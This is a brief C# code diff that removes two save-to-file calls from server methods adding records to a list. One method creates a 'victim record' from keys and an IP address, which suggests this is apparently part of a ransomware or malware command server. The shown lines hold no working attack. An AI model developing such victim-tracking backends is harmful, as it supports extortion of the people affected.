@@ -67,7 +67,6 @@ namespace Server.Data
             lock (_locker) {
                 _records.Add(RecordsGenerator.GenerateVictimRecord(keys, ip));
             }
-            await DataWriterReader.SaveRecordsToFile();
         }
 
         public static async Task AddRecordAsync(RecordData record)
@@ -86,7 +85,6 @@ namespace Server.Data
             {
                 _records.Add(record);
             }
-            await DataWriterReader.SaveRecordsToFile();
         }
 
         public static List<RecordData> GetRecordsList()
